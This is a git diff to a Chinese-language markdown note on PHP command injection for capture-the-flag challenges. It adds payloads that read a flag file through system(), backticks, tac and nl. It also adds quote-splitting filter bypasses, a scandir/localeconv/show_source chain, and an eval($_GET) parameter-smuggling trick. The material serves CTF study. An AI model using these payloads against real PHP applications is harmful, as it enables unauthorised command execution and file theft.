@@ -75,12 +75,16 @@ PHP探针是用来探测空间、服务器运行状况和PHP信息的。探针�
 如果网页中有命令执行相关的函数，就可以想办法绕过前期的检测(比如`正则校验`)，然后执行它！<br>
 常见的`php`命令注入:<br>
 ```php
-c=echo scandir(".")[2]; //打印当前目录下的文件，第三个元素
-c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
-
 c=system("cat fl*g.php | grep  -E 'fl.g' "); // 获取文件的内容，然后用grep 采用正则表达式的方法，获得flag
 c=system("cat fl*g.php"); // 需要采用view-source协议
 c=system("tac fl*g.php"); //倒叙（行）显示文件内容
 
-echo `cat fl''ag.p''hp`; // 反引号执行命令， 用单引号绕过flag,php不能打印的限制，需要采用view-source协议
+echo `cat fl''ag.p''hp`; // 反引号执行命令， 用单引号绕过flag,php不能打印的限制，需要采用view-source协议，无法对命令cat本身进行这种操作
+echo `nl fl''ag.php` // nl给每个输出加上行号
+
+c=echo scandir(".")[2]; //打印当前目录下的文件，第三个元素
+c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
+c=show_source(next(array_reverse(scandir(pos(localeconv()))))); // 十分牛逼，localeconv的第一个元素是'.'，即当前目录，pos是current的别名，返回数组第一个元素，然后scandir读取当前目录，array_reverse倒序，next取下一个元素（即倒数第二个元素），show_source是highlight_file的别名显示源码
+
+c=eval($_GET[a]);&a=system('cat flag.php');//传入两个参数，c用于绕过校验，a才是真正的命令执行
 ```
